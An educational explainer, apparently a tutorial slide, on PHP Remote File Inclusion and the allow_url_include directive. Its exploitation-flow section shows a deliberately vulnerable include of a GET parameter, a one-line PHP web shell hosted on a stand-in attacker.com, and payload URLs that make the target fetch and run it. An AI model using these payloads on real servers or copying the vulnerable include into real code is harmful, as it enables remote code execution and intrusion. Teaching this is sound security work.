Remote File Inclusion: Direct Code Execution

RFI allows attackers to include and execute arbitrary code from a remote server they control, often leading to immediate Remote Code Execution (RCE).

The allow_url_include Directive

For RFI to work in PHP, this directive in php.ini must be set to On. It's typically Off by default in modern PHP for security.

Immediate RCE Potential

If enabled, an attacker can host a malicious script on their server and force the vulnerable application to download and execute it, leading to direct RCE.

Key Takeaway

RFI is a critical vulnerability that allows direct remote code execution by including attacker-controlled remote files, contingent on the allow_url_include PHP directive being enabled.

RFI Exploitation Flow

# Vulnerable PHP code
<?php
    include($_GET['page']);
?>

# Attacker's malicious shell.txt (on attacker.com)
<?php system($_GET['cmd']); ?>

# Attacker payload
http://example.com/index.php?page=http://attacker.com/malicious_shell.txt

# Execute commands
http://example.com/index.php?page=http://attacker.com/malicious_shell.txt&cmd=id
Attacker provides remote URL
Vulnerable server fetches & executes
Attacker achieves RCE
